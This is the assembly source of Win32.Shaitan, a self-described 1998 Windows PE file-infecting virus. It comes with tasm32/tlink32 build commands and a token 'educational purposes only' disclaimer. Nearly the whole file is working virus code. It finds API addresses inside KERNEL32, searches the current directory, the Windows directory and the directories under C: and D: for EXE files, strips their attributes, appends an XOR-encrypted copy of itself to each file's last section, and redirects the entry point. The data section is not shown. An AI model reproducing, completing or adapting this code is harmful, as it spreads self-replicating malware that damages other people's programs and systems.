;----------------------------------------------------------------------------
;             Win32.Shaitan (C)opyright 1998 The Shaitan [SLAM]
;
;
; Win32.Shaitan is a non-resident infector of Windows 9x/NT/32s Portable
; Executable (PE) files.
;
;
; Description
; -----------
;       When a file infected by Win32.Shaitan is executed, the virus looks up
; the current process' Import  table  for the  address of GetModuleHandle API
; function. If located, the API  function will be called to retrieve the base
; address  of  KERNEL32.DLL.  Otherwise,  a hard-coded  address  (0xbff70000)
; will be assumed. Next, using this address, the virus scans the Export Table
; of KERNEL32.DLL for the address of the GetProcAddress API function. Finally
; using this function the virus obtains addresses  of all other API functions
; it needs (e.g CreateFileA, FindFirstFileA etc).  The virus searches for and
; infects files in the following order:
;       - Current Directory
;       - Windows base directory
;       - Directories in C:\
;       - Directories in D:\ (after checking whether it's a CDROM drive)
; The file encrypts its data using a  simple xor operation  with 0xFF as key.
; Files are  infected by appending  the virus to the last section in the file
; and  increasing  its size. The  virus uses  memory-mapped  files to improve
; performance. Infected files will grow by about 3k.
;
; Umm, that's about all folks! This is my first Win32 virus, so if something
; doesnt work, well... maybe next time :) The code is heavily commented, so
; it should be easy enough to follow (if you can't... dont ask me, i can't 
; really follow it either! ;)
;
;                               Disclaimer
;                               ----------
; THIS CODE IS MEANT FOR EDUCATIONAL PURPOSES ONLY. THE AUTHOR CANNOT BE HELD
; RESPONSIBLE FOR ANY  DAMAGE CAUSED DUE TO USE,  MISUSE OR INABILITY  TO USE
; THE SAME.
;
; To compile, use:
; ----------------
; tasm32 /ml /m5 shaitan.asm
; tlink32 /c /Tpe /aa shaitan.obj, shaitan.exe, ,c:\tasm\lib\import32.lib
; pewrsec shaitan.exe
;
;----------------------------------------------------------------------------

.386p
.model flat

;----------------------------------------------------------------------------
; Some equates to make our code more readable :)
;----------------------------------------------------------------------------

L                               equ     
GENERIC_READ                    equ     80000000h
GENERIC_WRITE                   equ     40000000h
GENERIC_READ_WRITE              equ     GENERIC_READ or GENERIC_WRITE
OPEN_EXISTING                   equ     00000003h
FILE_SHARE_READ                 equ     00000001h
FILE_ATTRIBUTE_NORMAL           equ     00000080h
FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
PAGE_READWRITE                  equ     00000004h
PAGE_WRITECOPY                  equ     00000008h
FILE_MAP_WRITE                  equ     00000002h
FILE_BEGIN                      equ     00000000h
DRIVE_CDROM                     equ     00000005h

MAX_INFECT                      equ     00000005h ; Max. files to infect
                                                  ; at one go...  

FILETIME struc
        dwLowDateTime   dd      ?
        dwHighDateTime  dd      ?
FILETIME ends

WIN32_FIND_DATA struc
        dwFileAttributes        dd              ?
        ftCreationTime          FILETIME        ?
        ftLastAccessTime        FILETIME        ?
        ftLastWriteTime         FILETIME        ?
        nFileSizeHigh           dd              ?
        nFileSizeLow            dd              ?
        dwReserved0             dd              ?
        dwReserved1             dd              ?
        cFileName               db      260     dup     (?)
        cAlternateFileName      db      14      dup     (?)
WIN32_FIND_DATA ends

code_len        equ     v_end - v_start

;----------------------------------------------------------------------------
; Functions imported by Generation-1 -
;----------------------------------------------------------------------------

extrn   GetModuleHandleA:PROC
extrn   ExitProcess:PROC

;----------------------------------------------------------------------------
; Some dummy data for Generation-1 -
;----------------------------------------------------------------------------
.data
dummy_data      db      "SLAM Roqs!"

;----------------------------------------------------------------------------
; CODE section -
;----------------------------------------------------------------------------
.code
v_start:
        db      0b8h                            ; mov eax,xxxx where xxxx
rva_eip dd      1000h                           ; is RVA of EIP (patched at
                                                ; infection time)

        call    get_delta                       ; Call next instruction
get_delta:
        pop     ebp                             ; Pop out address from stack
        mov     ebx,ebp                         ; Save it in EBX
        sub     ebp,offset get_delta            ; EBP = Delta pointer!

        sub     ebx,eax                         ; Deduct RVA of EIP
        sub     ebx,0Ah                         ; EBX = Base address of module

        push    ebx                             ; Not really required, but...
        call    crypt                           ; Decrypt virus data
        pop     ebx                             ; Get saved EBX back

        mov     [module_base+ebp],ebx           ; Save module base
        mov     [kernel32+ebp],0bff70000h       ; Umm... Default address
                                                ; of KERNEL32.DLL (?)

; Now we try to retrieve the address of GetModuleHandleA from the current
; process's Import table...
get_GMHA:
        mov     esi,[module_base+ebp]   ; ESI = Base address of process.
        cmp     word ptr [esi],'ZM'     ; Is the base correctly assumed?.
        jne     get_GPA                 ; No. Quit...

        xor     eax,eax                 ; EAX = 0
        mov     ax, word ptr [esi+3ch]  ; Get RVA of PE header.
        cmp     ax,0                    ; No pointer to PE offset?
        je      get_GPA                 ; No. Can't continue...
        mov     esi,eax                 ; ESI = RVA of PE offset
        add     esi,[module_base+ebp]   ; Convert RVA to VA.
        cmp     word ptr [esi],'EP'     ; Is the PE header there?.
        jne     get_GPA                 ; Nope. Quit...

        mov     esi,[esi+80h]           ; RVA of .idata section
        add     esi,[module_base+ebp]   ; ESI = Start of .idata section

; Now, find the IMAGE_IMPORT_DESCRIPTOR for KERNEL32.DLL imports
        mov     eax,esi                 ; EAX = Start of .idata
find_ik32:
        mov     esi,eax                 ; ESI = First/next IMPORT_DESCRIPTOR.
        mov     esi,[esi+0ch]           ; RVA of imported module ASCIIZ string
        add     esi,[module_base+ebp]   ; RVA >> VA
        cmp     [esi],'NREK'            ; IMPORT_DESCRIPTOR for K32?
        je      ik32_found              ; Yes, we found it!
        add     eax,14h                 ; EAX = Next IMPORT_DESCRIPTOR.
        jmp     find_ik32               ; Loop till found...
ik32_found:
        mov     esi,eax                 ; ESI = K32 IMPORT_DESCRIPTOR.
        mov     ebx,[esi+10h]           ; Get RVA of IMAGE_THUNK_DATA array.
        add     ebx,[module_base+ebp]   ; RVA >> VA.
        cmp     dword ptr [esi],0       ; NULL "OriginalFirstThunk" field?
        je      get_GPA                 ; Yes, No hint-name table then :(
        mov     esi,[esi]               ; Pointer to pointer!
        add     esi,[module_base+ebp]   ; RVA >> VA
        mov     edx,esi                 ; 
        xor     eax,eax                 ; Init EAX (for use as an index).

iAPI_loop:
        cmp     dword ptr [edx],0       ; No more RVAs?
        je      get_GPA                 ; Yes. Jump...
        cmp     byte ptr [edx+3],80h    ; Ordinal?
        je      inc_ndx                 ; Yes. Skip...
        mov     esi,[edx]               ; "     "       "       "       "
        add     esi,[module_base+ebp]   ; "     "       "       "       "
        add     esi,2                   ; ESI = Start of ASCIIZ API name.
        mov     ecx,GMH_string_len      ; ECX = Length of string (API name).
        mov     edi,offset GMH_string   ; EDI = String to compare with.
        add     edi,ebp                 ;
compare:
        repe    cmpsb                   ; Compare the 2 strings...
        cmp     ecx,0                   ; Match found?
        je      API_found               ; Yes! Jump...
inc_ndx:
        inc     eax                     ; No. Increment our index.
        add     edx,4                   ;
        jmp     iAPI_loop               ; Continue looping...
API_found:
        shl     eax,2                   ; Multiply by 4.
; We had saved VA of IMAGE_THUNK_DATA array in EBX. Remember?
        add     eax,ebx                 ; Point to corresponding element.
        mov     eax,[eax]               ; EAX = API call address

        mov     ebx,offset k32_string   ; Offset of "KERNEL32.DLL" string
        add     ebx,ebp                 ; Adjust with delta
        push    ebp                     ; Save our delta pointer
        push    ebx                     ; Push parameter on the stack
        call    eax                     ; Call GetModuleHandleA
        pop     ebp                     ; Restore our delta pointer

        mov     [kernel32+ebp],eax      ; Save address of KERNEL32.DLL

get_GPA:
        mov     esi,[kernel32+ebp]      ; Point ESI to K32 base address
        cmp     word ptr [esi],'ZM'     ; Is K32 really there?
        jne     quit                    ; Nope. Bail out now!

        xor     eax,eax                 ; EAX = 0
        mov     ax,word ptr [esi+3ch]   ; Get RVA of PE header pointer.
        cmp     ax,0                    ; No pointer to PE offset?
        je      quit                    ; No. Can't continue...
        mov     esi,eax                 ; ESI = RVA of PE offset
        add     esi,[kernel32+ebp]      ; Convert RVA to VA.
        cmp     word ptr [esi],'EP'     ; Is the PE header there?
        jne     quit                    ; Naw. Cannot continue...

        mov     eax,[esi+78h]           ; PE hdr offset 78h points to .edata.
        add     eax,[kernel32+ebp]      ; Convert RVA to VA.
        xchg    eax,esi                 ; Put VA back into ESI.

        mov     eax,[esi+14h]           ; Get # of functions exported by K32
        mov     [NumberOfFunctions+ebp],eax   ; Save.

        mov     eax,[esi+1ch]           ; RVA of table of exported function
                                        ; addresses.
        add     eax,[kernel32+ebp]      ; Convert RVA to VA.
        mov     [AddressOfFunctions+ebp],eax  ; Save.

        mov     eax,[esi+20h]           ; RVA of table containing API name
                                        ; strings.
        add     eax,[kernel32+ebp]      ; Convert RVA to VA.
        mov     [AddressOfNames+ebp],eax      ; Save.

        mov     eax,[esi+24h]           ; RVA of table of export ordinals of
                                        ; all functions exported by name.
        add     eax,[kernel32+ebp]      ; Convert RVA to VA.
        mov     [AddressOfOrdinals+ebp],eax   ; Save.

        xor     eax,eax                 ; EAX = 0.
        mov     ebx,[NumberOfFunctions+ebp]   ; Use EBX as a counter.
apisearch_loop:
        mov     esi,offset GPA_string   ; API function to search for...
        add     esi,ebp                 ; Adjust with delta pointer...
        mov     ecx,GPA_string_len      ; Length of API function name string.
        mov     edi,[AddressOfNames+ebp]; Point to start of table containing
        add     edi,eax                 ; API function name strings...
        mov     edi,[edi]               ; "     "       "       "       "
        add     edi,[kernel32+ebp]      ; "     "       "       "       "
        cld                             ; Clear direction flag.
        repe    cmpsb                   ; Compare the two strings.
        cmp     ecx,0                   ; Exact match found?.
        je      match                   ; Yes! Jump...
        dec     ebx                     ; Decrement our counter.
        cmp     ebx,0                   ; Have we gone thru entire table?.
        je      quit                    ; Yes. API not found! Bail out...
        add     eax,4                   ; No. Lets compare the next string.
        jmp     apisearch_loop          ; Continue looping...
match:
        shr     eax,1                   ; Divide by 2 (array is of WORDs).
        add     eax,[AddressOfOrdinals+ebp] ; Point to relevant element in array.
        xor     ebx,ebx                 ; EBX = 0.
        mov     bx,word ptr [eax]       ; Get our index into AddressOfFuncs.
        shl     ebx,2                   ; Multiply by 4 (array is of DWORDs).
        add     ebx,[AddressOfFunctions+ebp]; Point to relevant element in array.
        mov     eax,[ebx]               ; EAX = RVA of API function address.
        add     eax,[kernel32+ebp]      ; EAX = Address of API function!!!

        mov     [_GetProcAddress+ebp],eax       ; Save address...

; Now we retrieve the addresses of all API functions that we'll be using...
Get_API_addresses:
        mov     edi,offset API_strings  ; Point to ASCIIZ string table
        add     edi,ebp                 ; Adjust with delta pointer...

APIaddress_loop:
        push    edi                     ; Save offset of ASCIIZ API name
        push    edi                     ; Push onto stack for API call
        call    GetAPIAddress           ; Retrieve address of API function
        pop     edi                     ; Restore address of ASCIIZ string
        push    eax                     ; Save address of API function
        xor     eax,eax                 ; EAX = 0
        repne   scasb                   ; Search for end of string
        pop     eax                     ; Restore address of API function
        mov     [edi],eax               ; Save it...
        add     edi,4                   ; Point to next ASCIIZ API string
        cmp     [edi],'SLAM'            ; Was that the last string?
        jne     APIaddress_loop         ; No. Loop till done...

        push    ebp                     ; Save delta pointer
        mov     eax,offset start_dir    ; Buffer to store directory name
        add     eax,ebp                 ; Adjust with delta pointer
        push    eax                     ; Push parameter on stack
        push    L 128                   ; Length of dirname buffer
        mov     eax,[_GetCurrentDirectory+ebp] ; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore delta pointer
        
        call    InfectCurrentDirectory  ; Infect files in starting directory
        cmp     [infect_counter+ebp],MAX_INFECT ; Max. # of files infected?
        je      restore_start_dir       ; Yes. Quit...

        push    ebp                     ; Save delta
        push    L 128                   ; Length of dir buffer
        mov     eax,offset win_dir      ; Location of dir buffer
        add     eax,ebp                 ; Adjust...
        push    eax                     ; Push location of buffer
        mov     eax,[_GetWindowsDirectory+ebp] ; API to call
        call    eax                     ; Call API function
        pop     ebp                     ; Restore delta
        mov     eax,offset win_dir      ; EAX = ASCIIZ windows dir name
        add     eax,ebp                 ; Adjust...
        call    SetDir                  ; Change directory to windows dir
        call    InfectCurrentDirectory  ; Infect files in it...
        cmp     [infect_counter+ebp],MAX_INFECT ; Max. # of files infected?
        je      restore_start_dir       ; Yes. Quit...

        mov     eax,offset root_dir_c   ; Infect all dirs in C:\
        add     eax,ebp                 ; Adjust...
        call    Search&InfectDirs       ; Infect...
        cmp     [infect_counter+ebp],MAX_INFECT ; Max. # of files infected?
        je      restore_start_dir       ; Yes. Quit...

        push    ebp                     ; Save delta
        mov     eax,offset root_dir_d   ; ASCIIZ D:\
        add     eax,ebp                 ; Adjust with delta
        push    eax                     ; Push onto stack
        mov     eax,[_GetDriveType+ebp] ; API function to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore delta
        cmp     eax,DRIVE_CDROM         ; Is this a CDROM drive?
        je      restore_start_dir       ; Yes. Do not try to infect!
        cmp     eax,0                   ; Drive type undeterminable?
        je      restore_start_dir       ; Yes. Let's play it safe...

        mov     eax,offset root_dir_d   ; Infect all dirs in D:\
        add     eax,ebp                 ; Adjust...
        call    Search&InfectDirs       ; Infect...

restore_start_dir:
        mov     eax,offset start_dir    ; Name of starting directory
        add     eax,ebp                 ; Adjust...
        call    SetDir                  ; Set directory back to start dir

quit:
        push    ebp                             ; Save delta pointer
        mov     eax,[_GetCommandLine+ebp]       ; Address of API to call
        call    eax                             ; Call API
        pop     ebp                             ; Restore delta pointer
        mov     edi,eax                         ; EDI = Address of cmdline
        inc     edi                             ; Inc by one (skip the ")
        mov     ecx,80h                         ; Search upto 80h bytes
        mov     eax,'"'                         ; Search for "
        cmp     byte ptr [edi-1],'"'            ; Was the first byte a " ?
        je      find_end_cmdline                ; Yes. Continue...
        mov     eax,' '                         ; No. Look for a space then
find_end_cmdline:
        repne   scasb                           ; Search for end of string
        cmp     dword ptr [edi-12],'IAHS'       ; G-1? ("SHAITAN.EXE")
        je      g1_quit                         ; Yup. Exit normally...
                                              
jump_to_host:
        mov     eax,[module_base+ebp]           ; Get module's base address
        add     eax,[ori_ip+ebp]                ; Add original EIP to it
        push    eax                             ; Remember .COM infection? :)
        ret                                     ; Jump to the original EIP!

g1_quit:
        xor     eax,eax                         ; EAX = 0 = Return value
        push    eax                             ; Push parameter on stack
        call    ExitProcess                     ; Call API to quit

;----------------------------------------------------------------------------
; GetAPIAddress - Calls GetProcAddress to retrieve address of API function
;                 pointed to by EDI.
;
; Return value: EAX = Address of API function
;----------------------------------------------------------------------------
GetAPIAddress:
        push    ebp                             ; Save our delta pointer
        push    edi                             ; EAX = ASCIIZ API string
        mov     eax,[kernel32+ebp]              ; KERNEL32 base address
        push    eax                             ; "     "       "       "
        mov     eax,[_GetProcAddress+ebp]       ; Address of API to call
        call    eax                             ; Call API function
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; SetDir - Sets current directory to string pointed to by EAX
;----------------------------------------------------------------------------
SetDir:
        push    ebp                     ; Save delta pointer
        push    eax                     ; Push parameter on stack
        mov     eax,[_SetCurrentDirectory+ebp] ; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore delta pointer
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; InfectFile - Infects filename specified in "testfile" variable
;
; Return value: On success >> 1
;               On failure >> 0
;----------------------------------------------------------------------------
InfectFile:
        mov     [infect_status+ebp],0           ; Init. flag

        push    ebp                             ; Save delta
        push    [testfile+ebp]                  ; ASCIIZ filename
        mov     eax,[_GetFileAttributes+ebp]    ; API to call
        call    eax                             ; Retrieve original attributes
        pop     ebp                             ; Restore delta
        cmp     eax,0ffffffffh                  ; Failure?
        je      infect_end                      ; Yes. Cannot continue...
        mov     [ori_attrib+ebp],eax            ; Save original attributes

        push    ebp                             ; Save delta
        push    FILE_ATTRIBUTE_NORMAL           ; Remove all attributes
        push    [testfile+ebp]                  ; ASCIIZ filename
        mov     eax,[_SetFileAttributes+ebp]    ; API to call
        call    eax                             ; Remove read-only etc attrib
        pop     ebp                             ; Restore delta
        cmp     eax,0                           ; Failure?
        je      infect_end                      ; Yes. Cannot continue...
        
open_file:
        push    ebp                             ; Save delta pointer
        push    L 0                             ; Template file (?)
        push    FILE_ATTRIBUTE_NORMAL           ; Attribute of file
        push    OPEN_EXISTING                   ; Open an existing file
        push    L 0                             ; Security Attributes
        push    FILE_SHARE_READ                 ; Share mode
        push    GENERIC_READ_WRITE              ; Access mode
        push    [testfile+ebp]                  ; ASCIIZ Filename
        mov     eax,[_CreateFileA+ebp]          ; Address of API call
        call    eax                             ; Call API to open file
        pop     ebp                             ; Restore delta pointer

        cmp     eax,0FFFFFFFFh                  ; File open failed?
        je      infect_end                      ; Yes. Cannot proceed...
        mov     [file_handle+ebp],eax           ; Save file handle

create_file_map:
        add     [new_filesize+ebp],code_len + 400h ; Inc. by this many bytes

        push    ebp                             ; Save delta pointer
        push    L 0                             ; Name of mapping object
        push    [new_filesize+ebp]              ; Max size of mapping object
        push    L 0                             ; "     "       "       "
        push    PAGE_READWRITE                  ; Read/Write access
        push    L 0                             ; Security attributes
        push    [file_handle+ebp]               ; Handle of file to map
        mov     eax,[_CreateFileMappingA+ebp]   ; Address of API call
        call    eax                             ; Call API to map file
        pop     ebp                             ; Restore delta pointer

        cmp     eax,0                           ; File mapping failed?
        je      close_file                      ; Yes. Cannot proceed...
        mov     [map_handle+ebp],eax            ; Save mapping object handle

create_map_view:
        push    ebp                             ; Save delta pointer
        push    [new_filesize+ebp]              ; No. of bytes to map
        push    L 0                             ; File offset (low)
        push    L 0                             ; File offset (high)
        push    FILE_MAP_WRITE                  ; Read/Write access
        push    [map_handle+ebp]                ; Handle to mapping object
        mov     eax,[_MapViewOfFile+ebp]        ; Address of API call
        call    eax                             ; Create a map file view
        pop     ebp                             ; Restore delta pointer

        cmp     eax,0                           ; Couldn't create map file view?
        je      close_map                       ; Yes. Cannot proceed...
        mov     [view_address+ebp],eax          ; Address of map view

fun_stuff:
        mov     eax,[ori_ip+ebp]                ; Get original EIP of host
        mov     [temp_ip+ebp],eax               ; Save it in a temp. variable

        mov     esi,[view_address+ebp]          ; Get address of map view
        cmp     word ptr [esi],'ZM'             ; Is it an EXE file?
        jne     close_view                      ; No. Cannot proceed...

        cmp     word ptr [esi+12h],'SW'         ; Already infected?
        je      close_view                      ; Yes. Quit...
        mov     word ptr [esi+12h],'SW'         ; Otherwise mark as infected 

        xor     eax,eax                         ; EAX = 0
        mov     ax,word ptr [esi+3ch]           ; Get pointer to PE header
        cmp     ax,0                            ; No pointer to PE offset?
        je      close_view                      ; No. Jump...
        cmp     eax,[adj_filesize+ebp]          ; Compare with actual filesize
        jae     close_view                      ; Greater? (Happened once!)
        mov     esi,eax                         ; ESI = RVA of PE ofset
        add     esi,[view_address+ebp]          ; Convert to VA
        cmp     word ptr [esi],'EP'             ; Is the PE header present?
        jne     close_view                      ; No. Cannot proceed...
        mov     [PE_hdr+ebp],esi                ; Save VA of PE header
; Now ESI contains address of PE header...
        mov     eax,[esi+28h]                   ; Get original entry point RVA
        mov     [ori_ip+ebp],eax                ; Save it...
        mov     eax,[esi+3ch]                   ; Get file align value
        mov     [file_align+ebp],eax            ; Save it...

        mov     ebx,[esi+74h]                   ; # of entries in IMG_DATA_DIR
        shl     ebx,3                           ; Multiply by 8
        xor     eax,eax                         ; EAX = 0
        mov     ax,word ptr [esi+6h]            ; No. of sections in file
        dec     eax                             ; Decrease by one
        mov     ecx,28h                         ; Size of IMAGE_SECTION_HDR
        mul     ecx                             ; Multiply...
        add     esi,78h                         ; ESI = Addr. of IMG_DATA_DIR
        add     esi,ebx                         ; ESI = Addr. of section table
        add     esi,eax                         ; ESI = Addr. of last entry

; Now ESI is pointing to last entry in section table (usually .reloc)

; Modify the section characteristics flags... (+CEW)
        or      dword ptr [esi+24h],00000020h   ; Section now contains CODE
        or      dword ptr [esi+24h],20000000h   ; Section is now EXECUTABLE
        or      dword ptr [esi+24h],80000000h   ; Section is now WRITEABLE

        mov     eax,[esi+10h]                   ; Get SizeOfRawdata
        mov     [ori_size_of_rawdata+ebp],eax   ; Save it...
        
        add     dword ptr [esi+8h],code_len     ; Inc size of VirtualSize

        mov     eax,[esi+8h]                    ; Get new size in EAX
        mov     ecx,[file_align+ebp]            ; ECX = File alignment
        div     ecx                             ; Get remainder in EDX
        mov     ecx,[file_align+ebp]            ; ECX = File alignment
        sub     ecx,edx                         ; No. of bytes to pad...
        mov     [esi+10h],ecx                   ; "     "       "       "
        mov     eax,[esi+8h]                    ; Get current VirtualSize
        add     eax,[esi+10h]                   ; EAX = SizeOfRawdata padded
        mov     [esi+10h],eax                   ; Set new SizeOfRawdata
        mov     [size_of_rawdata+ebp],eax       ; Also, save it...

        mov     eax,[esi+0ch]                   ; Get VirtualAddress
        add     eax,[esi+8h]                    ; Add VirtualSize
        sub     eax,code_len                    ; Deduct size of virus
        mov     [new_ip+ebp],eax                ; EAX = New EIP! Save it...
        mov     [rva_eip+ebp],eax               ; Patch...

        mov     eax,[ori_size_of_rawdata+ebp]   ; Original SizeOfRawdata
        mov     ebx,[size_of_rawdata+ebp]       ; New SizeOfRawdata
        sub     ebx,eax                         ; Increase in size
        mov     [inc_size_of_rawdata+ebp],ebx   ; Save increase value...
        mov     eax,[esi+14h]                   ; File offset of sec's rawdata
        add     eax,[size_of_rawdata+ebp]       ; Add size of new rawdata
        mov     [new_filesize+ebp],eax          ; EAX = New filesize! Save...
        mov     [adj_filesize+ebp],eax          ;

        mov     eax,[esi+14h]                   ; File offset of sec's rawdata
        add     eax,[esi+8h]                    ; Add VirtualSize of section
        sub     eax,code_len                    ; Deduct virus length from it
        add     eax,[view_address+ebp]          ; RVA >> VA (sorta)
; Now EAX points to offset where we'll append the virus code...

        push    eax                             ; Save EAX
        mov     byte ptr [key+ebp],0ffh         ; Set encryption key to 0xFF
        call    crypt                           ; Encrypt Vx data
        pop     eax                             ; Restore EAX

        mov     edi,eax                         ; Location to copy to...
        mov     esi,offset v_start              ; Location to copy from...
        add     esi,ebp                         ; Adjust with delta pointer
        mov     ecx,code_len                    ; No. of bytes to copy
        rep     movsb                           ; Copy all the bytes!

        call    crypt                           ; Decrypt Vx data

        mov     esi,[PE_hdr+ebp]                ; ESI = Addr. of PE header
        mov     eax,[new_ip+ebp]                ; Get value of new EIP in EAX
        mov     [esi+28h],eax                   ; Write it to the PE header
        mov     eax,[inc_size_of_rawdata+ebp]   ; Get inc. size of last section
        add     [esi+50h],eax                   ; Add it to SizeOfImage

        mov     eax,[temp_ip+ebp]               ; Get our saved host EIP
        mov     [ori_ip+ebp],eax                ; Restore...

        mov     [infect_status+ebp],1           ; Successful infection!

close_view:
        push    ebp                             ; Save delta pointer
        push    [view_address+ebp]              ; Push view address on stack
        mov     eax,[_UnmapViewOfFile+ebp]      ; API to call
        call    eax                             ; Call API to close view
        pop     ebp                             ; Restore delta pointer

close_map:
        push    ebp                             ; Save delta pointer
        push    [map_handle+ebp]                ; Handle of mapping object
        mov     eax,[_CloseHandle+ebp]          ; Address of API call
        call    eax                             ; Close mapping object
        pop     ebp                             ; Restore delta pointer

close_file:

truncate_file:
        push    ebp                             ; Save delta pointer
        push    FILE_BEGIN                      ; Move from start of file
        push    L 0                             ; Distance to move (high)
        push    [adj_filesize+ebp]              ; "     "       "       "
        push    [file_handle+ebp]               ; Handle of file
        mov     eax,[_SetFilePointer+ebp]       ; API function to call
        call    eax                             ; Call API
        pop     ebp                             ; Restore delta pointer
        cmp     eax,0ffffffffh                  ; Seek failed?
        je      final_close                     ; Yes. Jump...

        push    ebp                             ; Save delta pointer
        push    [file_handle+ebp]               ; Handle of file to truncate
        mov     eax,[_SetEndOfFile+ebp]         ; API to call
        call    eax                             ; Call API to truncate file
        pop     ebp                             ; Restore delta pointer

; Now close the file...
final_close:
        push    ebp                             ; Save delta pointer
        push    [file_handle+ebp]               ; Handle of file to close
        mov     eax,[_CloseHandle+ebp]          ; Address of API call
        call    eax                             ; Call API to close file
        pop     ebp                             ; Restore delta pointer

restore_attrib:
        push    ebp                             ; Save delta
        push    [ori_attrib+ebp]                ; Original attributes
        push    [testfile+ebp]                  ; ASCIIZ filename
        mov     eax,[_SetFileAttributes+ebp]    ; API to call
        call    eax                             ; Restore original attributes
        pop     ebp                             ; Restore delta

infect_end:
        mov     eax,[infect_status+ebp]         ; Success/Failure flag
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; InfectCurrentDirectory - Infects upto 5 files in current directory
;----------------------------------------------------------------------------
InfectCurrentDirectory:

find_file:
        push    ebp                             ; Save delta pointer
        mov     eax,offset wfd_icd              ; Returned "FileFind" info
        add     eax,ebp                         ; Adjust with delta...
        push    eax                             ; Push it onto the stack
        mov     eax,offset file_match           ; Search for "*.EXE"
        add     eax,ebp                         ; Adjust with delta...
        push    eax                             ; Push it onto the stack
        mov     eax,[_FindFirstFileA+ebp]       ; <<<
        call    eax                             ; Call API to search for file
        pop     ebp                             ; Restore delta pointer

        cmp     eax,0ffffffffh                  ; No match found?
        je      icd_end                         ; No. Cannot proceed...
        mov     [icd_search_handle+ebp],eax     ; Save search handle

        mov     eax,offset wfd_icd.cFileName    ; Get filename of match file
        add     eax,ebp                         ; Adjust with delta...
        mov     [testfile+ebp],eax              ; Save pointer to it...

        cmp     [wfd_icd.nFileSizeHigh+ebp],0   ; High 32-bits of filesize
        jne     icd_findnext                    ; Way to big for us!

        mov     eax,[wfd_icd.nFileSizeLow+ebp]  ; Get filesize...
        mov     [adj_filesize+ebp],eax          ; Save it
        mov     [new_filesize+ebp],eax          ; Save it (this'll change l8r)

        call    InfectFile                      ; Infect file "testfile"
        cmp     eax,0                           ; Successful?
        je      icd_findnext                    ; No. Search for next file...
        inc     [infect_counter+ebp]            ; Yes. Increment counter
        cmp     [infect_counter+ebp],MAX_INFECT ; Max infect count reached?
        je      close_file_handle               ; Yes. Don't infect any more

icd_findnext:
        push    ebp                             ; Save delta pointer
        mov     eax,offset wfd_icd              ; Offset of WFD structure
        add     eax,ebp                         ; Adjust with delta pointer
        push    eax                             ; Push up the stack
        push    [icd_search_handle+ebp]         ; Push search handle too
        mov     eax,[_FindNextFileA+ebp]        ; Address of API to call
        call    eax                             ; Call API
        pop     ebp                             ; Restore delta pointer

        cmp     eax,L 0                         ; No match found?
        je      close_file_handle               ; No. Cannot proceed...

        mov     eax,offset wfd_icd.cFileName    ; Get filename of match file
        add     eax,ebp                         ; Adjust with delta...
        mov     [testfile+ebp],eax              ; Save pointer to it...

        cmp     [wfd_icd.nFileSizeHigh+ebp],0   ; High 32-bits of filesize
        jne     icd_findnext                    ; Way too big! Next...

        mov     eax,[wfd_icd.nFileSizeLow+ebp]  ; Get filesize...
        mov     [adj_filesize+ebp],eax          ; Save it
        mov     [new_filesize+ebp],eax          ; Save it (this'll change l8r)

        call    InfectFile                      ; Infect file "testfile"
        cmp     eax,0                           ; Successful?
        je      icd_findnext                    ; No. Search for next file...
        inc     [infect_counter+ebp]            ; Yes. Increment counter
        cmp     [infect_counter+ebp],MAX_INFECT ; Max infect count reached?
        jne     icd_findnext                    ; No. Search next...

close_file_handle:
        push    ebp                             ; Save delta
        mov     eax,[icd_search_handle+ebp]     ; Handle of search
        push    eax                             ; Push it onto stack
        mov     eax,[_FindClose+ebp]            ; Get address of API to call
        call    eax                             ; Call API
        pop     ebp                             ; Restore delta

icd_end:
        ret

;----------------------------------------------------------------------------
; Search&InfectDirs - 
;----------------------------------------------------------------------------
Search&InfectDirs:
        call    SetDir                  ; Change to directory in EAX
        cmp     eax,0                   ; Failure?
        je      sid_end                 ; Yeah. Quit...

        push    ebp                     ; Save delta
        mov     eax,offset wfd_dir      ; Address of struct to hold find-data
        add     eax,ebp                 ; Adjust with delta
        push    eax                     ; Push onto stack
        mov     eax,offset dir_match    ; File pattern to search for...
        push    eax                     ; Push onto stack
        mov     eax,[_FindFirstFileA+ebp]; API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore delta

        cmp     eax,0ffffffffh          ; No match???
        je      sid_end                 ; Yes. Can't continue...
   
        mov     [dir_search_handle+ebp],eax ; Save search handle

        cmp     [wfd_dir.dwFileAttributes+ebp],FILE_ATTRIBUTE_DIRECTORY
        jne     sid_next_dir            ; Not a directory, serch for next...

        mov     eax,offset wfd_dir.cFileName; Name of found directory
        add     eax,ebp                 ; Adjust with delta
        call    SetDir                  ; Change to that directory

        call    InfectCurrentDirectory  ; Infect files there

        mov     eax,offset dot_dot      ; Move one directory down (..)
        add     eax,ebp                 ; Adjust with delta
        call    SetDir                  ; Change to that directory

        cmp     [infect_counter+ebp],MAX_INFECT  ; Max. # of files infected?
        je      close_dir_handle                 ; Yes. Don't continue...
                
sid_next_dir:
        push    ebp                     ; Save delta
        mov     eax,offset wfd_dir      ; Find-data structure
        add     eax,ebp                 ; Adjust with delta
        push    eax                     ; Push onto stack
        push    [dir_search_handle+ebp] ; Push search handle too
        mov     eax,[_FindNextFileA+ebp] ; API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore delta

        cmp     eax,L 0                 ; No more dirs?
        je      close_dir_handle        ; No. Exit...

        cmp     [wfd_dir.dwFileAttributes+ebp],FILE_ATTRIBUTE_DIRECTORY
        jne     sid_next_dir            ; Not a directory. Search again...

        mov     eax,offset wfd_dir.cFileName; Name of found directory
        add     eax,ebp                 ; Adjust
        call    SetDir                  ; Change to found directory

        call    InfectCurrentDirectory  ; Infect files in directory

        mov     eax,offset dot_dot      ; Move back one directory
        add     eax,ebp                 ; Adjust...
        call    SetDir                  ; Change to that directory

        cmp     [infect_counter+ebp],MAX_INFECT  ; Max # of files infected?
        je      close_dir_handle                 ; Yes. Don't continue...
                
        jmp     sid_next_dir            ; Loop...

close_dir_handle:
        push    ebp                             ; Save delta
        mov     eax,[dir_search_handle+ebp]     ; Handle of search
        push    eax                             ; Push it onto stack
        mov     eax,[_FindClose+ebp]            ; Get address of API to call
        call    eax                             ; Call API
        pop     ebp                             ; Restore delta

sid_end:
        ret                             ; Return to caller

;----------------------------------------------------------------------------
